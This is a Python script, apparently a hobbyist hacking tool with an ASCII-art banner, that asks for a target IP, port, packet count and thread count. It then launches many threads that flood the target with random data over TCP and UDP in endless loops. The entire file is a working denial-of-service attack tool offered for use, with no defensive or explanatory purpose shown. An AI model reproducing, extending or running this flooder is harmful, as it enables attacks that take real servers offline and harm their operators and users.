import random
import socket
import threading
import os,sys

os.system("clear")
print("""\033[91m
 ██▓  ██▒   █▓   ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓██▒ ▓██░   █▒   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▒██░  ▓██  █▒░   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
\033[0m▒██░   ▒██ █░░   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
░██████▒▒▀█░       ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒░▓  ░░ ▐░       ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
░ ░ ▒  ░░ ░░         ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░ ░     ░░       ░         ░    ░   ▒   ░      ░   
    ░  ░   ░                 ░  ░     ░  ░       ░   
          ░                                          
""")
ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" (ddos/no):"))
times = int(input(" PAKET:"))
threads = int(input(" THREADS:"))
os.system("clear")
def ddos():
	data = random._urandom(1800)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack Ip %s:%s!!!"%(ip,port))
		except:
			print("[!] Server Down!!!")

def ddos2():
	data = random._urandom(180)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Attack Ip %s:%s!!!"%(ip,port))
		except:
			s.close()
			print("[!] Server Down!!!")

def ddos3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Attack Ip %s:%s!!!"%(ip,port))
		except:
			s.close()
			print("[!] Server Down!!!")

for x in range(threads):
	if choice == 'ddos':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()
